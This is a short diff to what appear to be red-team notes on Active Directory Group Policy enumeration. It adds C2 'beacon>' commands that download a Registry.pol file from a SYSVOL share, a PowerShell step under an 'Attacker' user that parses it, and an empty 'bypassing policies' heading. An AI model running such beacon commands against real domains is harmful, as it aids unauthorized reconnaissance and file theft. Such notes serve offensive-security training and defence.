@@ -21,7 +21,12 @@ enumeration of policies
                 gPCFileSysPath: \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}
                 --------------------
             beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine
+            beacon> download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
+        once we sync the file to our desktop we can read using parse-polfile cmdlet
+            PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
 
+bypassing policies
+    
 
 *********************
 
